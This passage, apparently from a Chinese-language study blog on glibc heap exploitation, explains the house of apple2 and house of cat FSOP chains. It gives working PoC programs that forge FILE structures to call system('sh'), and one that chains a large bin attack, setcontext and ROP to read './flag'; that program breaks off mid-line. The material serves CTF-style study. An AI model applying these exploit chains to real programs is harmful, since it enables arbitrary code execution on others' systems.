&#125;</span><br><span class="line">[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED        0x0002</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 需要绕过的点 if_4 */</span></span><br><span class="line">	<span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">/* 需要绕过的点 if_5 */</span></span><br><span class="line">	<span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">        <span class="comment">/*满足条件则会调用 _IO_WDOALLOCATE*/</span></span><br><span class="line">		<span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE(fp) != WEOF)</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	_IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf, fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)</span></span><br></pre></td></tr></table></figure></div>

<h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a><strong>poc</strong></h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* binsh = <span class="string">&quot;  sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;puts;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x80ed0</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span>* fake_FILE = (<span class="keyword">struct</span> _IO_FILE*) <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="type">size_t</span>* fake_vtable = (<span class="type">size_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span>* fake_wide_data = (<span class="keyword">struct</span> _IO_wide_data*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">size_t</span>* _IO_list_all = (<span class="type">size_t</span>*)(libc_base + <span class="number">0x21A680</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FSOP</span></span><br><span class="line">    fake_FILE-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_ptr = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_base = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_IO_read_ptr = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_read_end = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xD8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x216000</span>; <span class="comment">// vtable</span></span><br><span class="line">    fake_FILE-&gt;_wide_data = fake_wide_data;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0xE0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)fake_vtable;   <span class="comment">// _wide_data-&gt;_wide_vtable</span></span><br><span class="line">    fake_vtable[<span class="number">0x68</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)system;     <span class="comment">// _IO_WDOALLOCATE调用的函数指针，偏移量可通过查看汇编获取</span></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)fake_FILE, binsh);</span><br><span class="line">    *(_IO_list_all) = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="利用-IO-wdefault-xsgetn函数控制程序执行流"><a href="#利用-IO-wdefault-xsgetn函数控制程序执行流" class="headerlink" title="利用_IO_wdefault_xsgetn函数控制程序执行流"></a>利用<code>_IO_wdefault_xsgetn</code>函数控制程序执行流</h2><p>这条链执行的条件是调用到_IO_wdefault_xsgetn时rdx寄存器，也就是第三个参数不为<code>0</code>。如果不满足这个条件，可选用其他链。</p>
<h3 id="相关配置-2"><a href="#相关配置-2" class="headerlink" title="相关配置"></a><strong>相关配置</strong></h3><p>对<code>_IO_FILE_plus</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>0x800</code></li>
<li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可。</li>
<li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>
</ul>
<h3 id="函数调用链-2"><a href="#函数调用链-2" class="headerlink" title="函数调用链"></a><strong>函数调用链</strong></h3><p><code>_IO_wdefault_xsgetn-&gt;__wunderflow-&gt;_IO_switch_to_wget_mode-&gt;_IO_WOVERFLOW-&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)</code></p>
<p>详解：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_wdefault_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* more 为第三个参数，即 rdx。*/</span></span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="type">wchar_t</span> *s = (<span class="type">wchar_t</span>*) data;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">/* Data available. */</span></span><br><span class="line">      <span class="type">ssize_t</span> count = (fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">	  &#123;</span><br><span class="line">	    <span class="keyword">if</span> ((<span class="type">size_t</span>) count &gt; more)</span><br><span class="line">	      count = more;</span><br><span class="line">	    <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);</span><br><span class="line">	      fp-&gt;_wide_data-&gt;_IO_read_ptr += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">	      count = <span class="number">0</span>;</span><br><span class="line">	    <span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">	       <span class="type">wchar_t</span> *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">	       <span class="type">int</span> i = (<span class="type">int</span>) count;</span><br><span class="line">	       <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">		     *s++ = *p++;</span><br><span class="line">	       fp-&gt;_wide_data-&gt;_IO_read_ptr = p;</span><br><span class="line">         &#125;</span><br><span class="line">         more -= count;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">/* 首先判断第三个参数 rdx 是否为 0，我们需要他进行第二个判断 */</span></span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || __wunderflow (fp) == WEOF)</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">__wunderflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* _mode &gt; 0 */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &lt; <span class="number">0</span> || (fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">1</span>) != <span class="number">1</span>))</span><br><span class="line">     <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_wget_mode (fp) == EOF) <span class="comment">// 调用这里</span></span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">  &#123;</span><br><span class="line">      _IO_switch_to_main_wget_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">	<span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">save_for_wbackup</span> (fp, fp-&gt;_wide_data-&gt;_IO_read_end))</span><br><span class="line">		<span class="keyword">return</span> WEOF;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_wbackup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 需要 _wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF) <span class="comment">// 调用 _IO_WOVERFLOW</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_backup_base;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		  fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_base = fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    = fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="poc-2"><a href="#poc-2" class="headerlink" title="poc"></a><strong>poc</strong></h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* binsh = <span class="string">&quot;sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;puts;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x80ed0</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span>* fake_FILE = (<span class="keyword">struct</span> _IO_FILE*) <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="type">size_t</span>* fake_vtable = (<span class="type">size_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span>* fake_wide_data = (<span class="keyword">struct</span> _IO_wide_data*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">size_t</span>* _IO_list_all = (<span class="type">size_t</span>*)(libc_base + <span class="number">0x21A680</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_mode = <span class="number">1</span>;</span><br><span class="line">    fake_FILE-&gt;_wide_data = fake_wide_data;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xD8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x215A00</span> + <span class="number">0x3C0</span> + <span class="number">0x40</span> - <span class="number">0x18</span>; <span class="comment">// _IO_wstrn_jumps</span></span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0xE0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)fake_vtable;   <span class="comment">// _wide_data-&gt;_wide_vtable</span></span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0x20</span> / <span class="number">8</span>] = <span class="number">1</span>;     <span class="comment">// _wide_data-&gt;_IO_write_ptr, o+0x20</span></span><br><span class="line">    fake_vtable[<span class="number">0x18</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)system;     <span class="comment">// _IO_WOVERFLOW调用的函数指针</span></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)fake_FILE, binsh);   <span class="comment">// sh =&gt; 0x6873, 0x6873 &amp; 0x800 != 0</span></span><br><span class="line"></span><br><span class="line">    *(_IO_list_all) = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a><a class="link"   href="https://bbs.kanxue.com/thread-273895.htm" >house of cat <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h1><p> <code>house of apple2</code> 的一条路线之一。</p>
<h2 id="利用-IO-wfile-seekoff函数控制程序执行流"><a href="#利用-IO-wfile-seekoff函数控制程序执行流" class="headerlink" title="利用_IO_wfile_seekoff函数控制程序执行流"></a>利用_IO_wfile_seekoff函数控制程序执行流</h2><h3 id="相关配置-3"><a href="#相关配置-3" class="headerlink" title="相关配置"></a>相关配置</h3><p>对 <code>_IO_FILE_plus</code> 的设置如下：</p>
<ul>
<li><code>_flags</code> 设置为 <code>~0x8</code>，如果不能保证 <code>_lock</code> 指向可读写内存则 <code>_flags |= 0x8000</code>。</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_seekoff</code>即可</li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code> ，即满足<code>*A &gt; *(A + 8)</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>
</ul>
<h3 id="函数调用链-3"><a href="#函数调用链-3" class="headerlink" title="函数调用链"></a>函数调用链</h3><p><code>_IO_wfile_seekoff-&gt;_IO_switch_to_wget_mode-&gt;_IO_WOVERFLOW-&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)</code></p>
<p>详解：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Short-circuit into a separate function.  We don&#x27;t want to mix any</span></span><br><span class="line"><span class="comment">     functionality and we don&#x27;t want to touch anything inside the FILE</span></span><br><span class="line"><span class="comment">     object. */</span></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">do_ftell_wide</span> (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* POSIX.1 8.2.3.7 says that after a call the fflush() the file</span></span><br><span class="line"><span class="comment">     offset of the underlying file must be exact.  */</span></span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">			== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">			   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">		       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">		      || _IO_in_put_mode (fp));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 需要 _wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF) <span class="comment">// 调用 _IO_WOVERFLOW</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_backup_base;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		  fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_base = fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    = fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ucontext.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//leak libc_base</span></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;puts;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x702e0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// large bin attack: stderr -&gt; large</span></span><br><span class="line">    <span class="type">size_t</span> stderr_addr = libc_base + <span class="number">0x3b87a0</span>;</span><br><span class="line">    <span class="type">size_t</span> *large = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">&quot;./flag&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *unsorted = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">free</span>(large);</span><br><span class="line">    <span class="type">size_t</span> *payload = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(unsorted);</span><br><span class="line">    large[<span class="number">3</span>] = stderr_addr - <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> IO_wfile_jumps_addr = libc_base + <span class="number">0x3b3f40</span>;</span><br><span class="line">    <span class="comment">// mov rdx, [rdi+0x8]; mov [rsp], rax; call qword ptr [rdx+0x20]</span></span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x121a90</span>; </span><br><span class="line">    <span class="type">size_t</span> pop_rax_ret = libc_base + <span class="number">0x3aaa8</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rdi_ret = libc_base + <span class="number">0x23256</span>;</span><br><span class="line">    <span class="type">size_t</span> pop_rsi_ret = libc_base + <span class="number">0x2d89f</span>;</span><br><span class="line">    <span class="type">size_t</span> syscall_ret = libc_base + <span class="number">0x3ac69</span>;</span><br><span class="line">    <span class="type">size_t</span> ret = pop_rax_ret + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake file</span></span><br><span class="line">    large[<span class="number">-2</span>] &amp;= ~<span class="number">0x8</span>; <span class="comment">// _flags &amp;= ~0x8</span></span><br><span class="line">    large[<span class="number">-1</span>] = (<span class="type">size_t</span>) payload;</span><br><span class="line">    large[<span class="number">25</span>] = IO_wfile_jumps_addr + <span class="number">0x10</span>; <span class="comment">// vtable -&gt; _IO_wfile_jumps + 0x10</span></span><br><span class="line">    large[<span class="number">15</span>] = (<span class="type">size_t</span>) unsorted; <span class="comment">// _lock -&gt; rw memory</span></span><br><span class="line">    large[<span class="number">18</span>] = (<span class="type">size_t</span>) unsorted;<span class="comment">// _wide_data</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake _wide_data</span></span><br><span class="line">    unsorted[<span class="number">4</span>] = (<span class="type">size_t</span>) (<span class="number">-1</span>); <span class="comment">//_IO_write_ptr</span></span><br><span class="line">    unsorted[<span class="number">28</span>] = (<span class="type">size_t</span>) unsorted; <span class="comment">//_wide_vtable</span></span><br><span class="line">    unsorted[<span class="number">3</span>] = (<span class="type">size_t</span>) magic_gadget;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SigreturnFrame</span></span><br><span class="line">    payload[<span class="number">4</span>] = (<span class="type">size_t</span>) setcontext + <span class="number">53</span>;</span><br><span class="line">    payload[<span class="number">13</span>] = (<span class="type">size_t</span>) buf; <span class="comment">// rdi -&gt; &quot;./flag&quot;</span></span><br><span class="line">    payload[<span class="number">14</span>] = <span class="number">0</span>; <span class="comment">// rsi = 0</span></span><br><span class="line">    payload[<span class="number">17</span>] = <span class="number">0x100</span>; <span class="comment">// rdx = 0x100 read 0x100 bytes</span></span><br><span class="line">    payload[<span class="number">20</span>] = (<span class="type">size_t</span>) &amp;payload[<span class="number">31</span>]; <span class="comment">// rsp -&gt; fake stack</span></span><br><span class="line">    payload[<span class="number">21</span>] = ret; <span class="comment">// rip -&gt; ret;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// rop</span></span><br><span class="line">    payload[<span class="number">31</span>] = pop_rax_ret;</span><br><span class="line">    payload[<span class="number">32</span>] = <span class="number">2</span>;</span><br><span class="line">    payload[<span class="number">33</span>] = syscall_ret;</span><br><span class="line">    payload[<span class="number">34</span>] = pop_rax_ret;</span><br><span class="line">    payload[<span class="number">35</span>] = <span class="number">0</span>;</span><br><span class="line">    payload[<span class="number">36</span>] = pop_rdi_ret;</span><br><span class="line">    payload[<span class="number">37</span>] = <span class="number">3</span>;</span><br><span class="line">    payload[<span class="number">38</span>] = pop_rsi_ret;</span><br><span class="line">    payload[<span class="number">39</span>] = (<span class="type">size_t</span>) buf;</span><br><span class="line">    payload[<span class="number">40</span>] = syscall_ret;</span><br><span class="line">    payload[<span class="number">41</span>] = pop_rax_ret;</span><br><span class="line">    payload[<span class="number">42</span>] = <span class="number">1</span>;</span><br><span class="line">    payload[<span class="number">43</span>] = pop_rdi_ret;</span><br><span class="line">    payload[<span class="number">44</span>] = <span class="number">1</span>;</span><br><span class="line">    payload[<span class="number">45</span>] = pop_rsi_ret;</span><br><span class="line">    payload[<span class="number">46</span>] = (<span class="type">size_t</span>) buf;</span><br><span class="line">    payload[<span class="number">47</span>] = syscall_ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// __malloc_assert</span></span><br><span class="line">    <span class="type">size_t</span> *top_chunk_addr = unsorted + <span class="number">0x124</span>;</span><br><span class="line">    top_chunk_addr[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span 